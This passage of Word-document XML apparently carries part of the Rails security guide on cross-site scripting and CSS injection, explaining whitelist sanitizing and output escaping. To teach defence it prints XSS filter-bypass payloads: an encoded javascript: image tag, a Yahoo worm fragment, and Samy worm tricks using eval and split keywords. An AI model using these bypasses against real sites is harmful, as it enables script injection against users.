                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>strip_tags("some&lt;&lt;b&gt;script&gt;alert('hello')&lt;&lt;/b&gt;/script&gt;")</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="3872E05A" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>This returned “some&lt;script&gt;alert(‘hello’)&lt;/script&gt;”, which makes an attack work. That’s why I vote for a whitelist approach, using the updated Rails 2 method sanitize():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7D0185A" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="2A15C0E0" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>tags = %w(a acronym b strong i em li ul ol h1 h2 h3 h4 h5 h6 blockquote br cite sub sup ins p)</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="1F952599" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>s = sanitize(user_input, :tags</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>=&gt; tags, :attributes</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>=&gt; %w(href title))</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="45431042" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>This allows only the given tags and does a good job, even against all kinds of tricks and malformed tags.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="38D38C78" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">As a second step, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="a7"/>
        </w:rPr>
        <w:t>it is good practice to escape all output of the application</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">, especially when re-displaying user input, which hasn’t been input-filtered (as in the search form example earlier on). </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="a7"/>
        </w:rPr>
        <w:t xml:space="preserve">Use </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:t>escapeHTML()</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="a7"/>
        </w:rPr>
        <w:t xml:space="preserve"> (or its alias </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:t>h()</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="a7"/>
        </w:rPr>
        <w:t>) method</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> to replace the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="caps"/>
        </w:rPr>
        <w:t>HTML</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> input characters &amp;, ", &lt;, &gt; by their uninterpreted representations in </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="caps"/>
        </w:rPr>
        <w:t>HTML</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>&amp;amp;</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>&amp;quot;</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>&amp;lt</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">;, and </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>&amp;gt;</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">). However, it can easily happen that the programmer forgets to use it, so </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="a7"/>
        </w:rPr>
        <w:t xml:space="preserve">it is recommended to use the </w:t>
      </w:r>
      <w:hyperlink r:id="rId730" w:history="1">
        <w:r>
          <w:rPr>
            <w:rStyle w:val="a3"/>
            <w:i/>
            <w:iCs/>
          </w:rPr>
          <w:t>SafeErb</w:t>
        </w:r>
      </w:hyperlink>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="a7"/>
        </w:rPr>
        <w:t xml:space="preserve"> plugin</w:t>
      </w:r>
      <w:r>
        <w:t>. SafeErb reminds you to escape strings from external sources.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="26C09EED" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="6"/>
      </w:pPr>
      <w:r>
        <w:t>8.3.2.4 Obfuscation and Encoding Injection</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="469DC0F1" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Network traffic is mostly based on the limited Western alphabet, so new character encodings, such as Unicode, emerged, to transmit characters in other languages. But, this is also a threat to web applications, as malicious code can be hidden in different encodings that the web browser might be able to process, but the web application might not. Here is an attack vector in </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="caps"/>
        </w:rPr>
        <w:t>UTF</w:t>
      </w:r>
      <w:r>
        <w:t>-8 encoding:</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339072E" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="2CFFA509" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>&lt;IMG</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>SRC=&amp;amp;#106;&amp;amp;#97;&amp;amp;#118;&amp;amp;#97;&amp;amp;#115;&amp;amp;#99;&amp;amp;#114;&amp;amp;#105;&amp;amp;#112;&amp;amp;#116;&amp;amp;#58;&amp;amp;#97;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="666B08AF" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  &amp;amp;#108;&amp;amp;#101;&amp;amp;#114;&amp;amp;#116;&amp;amp;#40;&amp;amp;#39;&amp;amp;#88;&amp;amp;#83;&amp;amp;#83;&amp;amp;#39;&amp;amp;#41;&gt;</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="2DD52EE0" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">This example pops up a message box. It will be recognized by the above sanitize() filter, though. A great tool to obfuscate and encode strings, and thus “get to know your enemy”, is the </w:t>
      </w:r>
      <w:hyperlink r:id="rId731" w:history="1">
        <w:r>
          <w:rPr>
            <w:rStyle w:val="a3"/>
          </w:rPr>
          <w:t>Hackvertor</w:t>
        </w:r>
      </w:hyperlink>
      <w:r>
        <w:t>. Rails’ sanitize() method does a good job to fend off encoding attacks.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="667425EF" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="5"/>
      </w:pPr>
      <w:r>
        <w:t>8.3.3 Examples from the Underground</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="10E02482" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="a7"/>
        </w:rPr>
        <w:t>In order to understand today’s attacks on web applications, it’s best to take a look at some real-world attack vectors.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="01E54B2C" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">The following is an excerpt from the </w:t>
      </w:r>
      <w:hyperlink r:id="rId732" w:history="1">
        <w:r>
          <w:rPr>
            <w:rStyle w:val="a3"/>
          </w:rPr>
          <w:t>Js.Yamanner@m</w:t>
        </w:r>
      </w:hyperlink>
      <w:r>
        <w:t xml:space="preserve"> Yahoo! Mail </w:t>
      </w:r>
      <w:hyperlink r:id="rId733" w:history="1">
        <w:r>
          <w:rPr>
            <w:rStyle w:val="a3"/>
          </w:rPr>
          <w:t>worm</w:t>
        </w:r>
      </w:hyperlink>
      <w:r>
        <w:t>. It appeared on June 11, 2006 and was the first webmail interface worm:</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B47B8A4" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="54819673" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>&lt;img src='</w:t>
            </w:r>
            <w:hyperlink r:id="rId734" w:history="1">
              <w:r>
                <w:rPr>
                  <w:rStyle w:val="a3"/>
                </w:rPr>
                <w:t>http://us.i1.yimg.com/us.yimg.com/i/us/nt/ma/ma_mail_1.gif</w:t>
              </w:r>
            </w:hyperlink>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>'</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="0A758DDA" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  target=""onload="var http_request = false;    var Email = '';</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="5ACFA708" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  var IDList = '';   var CRumb = '';   function makeRequest(url, Func, Method,Param) { ...</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="39836A82" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">The worms exploits a hole in Yahoo’s </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="caps"/>
        </w:rPr>
        <w:t>HTML</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">/JavaScript filter, which usually filters all target and onload attributes from tags (because there can be JavaScript). The filter is applied only once, however, so the onload attribute with the worm code stays in place. This is a good example why blacklist filters are never complete and why it is hard to allow </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="caps"/>
        </w:rPr>
        <w:t>HTML</w:t>
      </w:r>
      <w:r>
        <w:t>/JavaScript in a web application.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0199CBAE" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Another proof-of-concept webmail worm is Nduja, a cross-domain worm for four Italian webmail services. Find more details on </w:t>
      </w:r>
      <w:hyperlink r:id="rId735" w:history="1">
        <w:r>
          <w:rPr>
            <w:rStyle w:val="a3"/>
          </w:rPr>
          <w:t>Rosario Valotta’s paper</w:t>
        </w:r>
      </w:hyperlink>
      <w:r>
        <w:t>. Both webmail worms have the goal to harvest email addresses, something a criminal hacker could make money with.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="04278C82" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">In December 2006, 34,000 actual user names and passwords were stolen in a </w:t>
      </w:r>
      <w:hyperlink r:id="rId736" w:history="1">
        <w:r>
          <w:rPr>
            <w:rStyle w:val="a3"/>
          </w:rPr>
          <w:t>MySpace phishing attack</w:t>
        </w:r>
      </w:hyperlink>
      <w:r>
        <w:t xml:space="preserve">. The idea of the attack was to create a profile page named “login_home_index_html”, so the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="caps"/>
        </w:rPr>
        <w:t>URL</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> looked very convincing. Specially-crafted </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="caps"/>
        </w:rPr>
        <w:t>HTML</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> and </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="caps"/>
        </w:rPr>
        <w:t>CSS</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> was used to hide the genuine MySpace content from the page and instead display its own login form.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7C4616D7" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">The MySpace Samy worm will be discussed in the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="caps"/>
        </w:rPr>
        <w:t>CSS</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Injection section.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="27E7239C" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="4"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">8.4 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="caps"/>
        </w:rPr>
        <w:t>CSS</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Injection</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="694DE8AB" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">— </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="caps"/>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:t>CSS</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="a7"/>
        </w:rPr>
        <w:t xml:space="preserve"> Injection is actually JavaScript injection, because some browsers (IE, some versions of Safari and others) allow JavaScript in </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="caps"/>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:t>CSS</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="a7"/>
        </w:rPr>
        <w:t xml:space="preserve">. Think twice about allowing custom </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="caps"/>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:t>CSS</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="a7"/>
        </w:rPr>
        <w:t xml:space="preserve"> in your web application.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6CE3CF85" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="caps"/>
        </w:rPr>
        <w:t>CSS</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Injection is explained best by a well-known worm, the </w:t>
      </w:r>
      <w:hyperlink r:id="rId737" w:history="1">
        <w:r>
          <w:rPr>
            <w:rStyle w:val="a3"/>
          </w:rPr>
          <w:t>MySpace Samy worm</w:t>
        </w:r>
      </w:hyperlink>
      <w:r>
        <w:t>. This worm automatically sent a friend request to Samy (the attacker) simply by visiting his profile. Within several hours he had over 1 million friend requests, but it creates too much traffic on MySpace, so that the site goes offline. The following is a technical explanation of the worm.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7A9D14A1" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">MySpace blocks many tags, however it allows </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="caps"/>
        </w:rPr>
        <w:t>CSS</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">. So the worm’s author put JavaScript into </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="caps"/>
        </w:rPr>
        <w:t>CSS</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> like this:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="6048"/>
      </w:tblGrid>
      <w:tr w:rsidR="009A002D" w14:paraId="20E1CA0E" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="772D534E" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D">
            <w:pPr>
              <w:divId w:val="245581198"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>&lt;div</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>style="background:url('javascript:alert(1)')"&gt;</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="11113229" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>So the payload is in the style attribute. But there are no quotes allowed in the payload, because single and double quotes have already been used. But JavaScript has a handy eval() function which executes any string as code.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265646B1" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="5BBE15C6" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D">
            <w:pPr>
              <w:divId w:val="285308783"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>&lt;div</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>id="mycode"</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>expr="alert('hah!')"</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>style="background:url('javascript:eval(document.all.mycode.expr)')"&gt;</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="56E2AE25" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>The eval() function is a nightmare for blacklist input filters, as it allows the style attribute to hide the word “innerHTML”:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="5280"/>
      </w:tblGrid>
      <w:tr w:rsidR="009A002D" w14:paraId="11825BD4" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="513FA3F9" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D">
            <w:pPr>
              <w:divId w:val="1324897117"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>alert(eval('document.body.inne' + 'rHTML'));</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="51099BB9" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>The next problem was MySpace filtering the word “javascript”, so the author used “java&lt;</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="caps"/>
        </w:rPr>
        <w:t>NEWLINE</w:t>
      </w:r>
      <w:r>
        <w:t>&gt;script" to get around this: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A9DA348" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="78A7DB86" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D">
            <w:pPr>
              <w:divId w:val="22246737"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>&lt;div</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>id="mycode"</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>expr="alert('hah!')"</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>style="background:url('java</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
                <w:rFonts w:ascii="MS Gothic" w:eastAsia="MS Gothic" w:hAnsi="MS Gothic" w:cs="MS Gothic" w:hint="eastAsia"/>
              </w:rPr>
              <w:t>↵ </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
                <w:rFonts w:hint="eastAsia"/>
              </w:rPr>
              <w:t>script:eval(document.all.mycode.expr)')"</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>&gt;</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="6C8DE7E1" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Another problem for the worm’s author were </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="caps"/>
        </w:rPr>
        <w:t>CSRF</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> security tokens. Without them he couldn’t send a friend request over </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="caps"/>
        </w:rPr>
        <w:t>POST</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">. He got around it by sending a </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="caps"/>
        </w:rPr>
        <w:t>GET</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> to the page right before adding a user and parsing the result for the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="caps"/>
        </w:rPr>
        <w:t>CSRF</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> token.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1B05A411" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
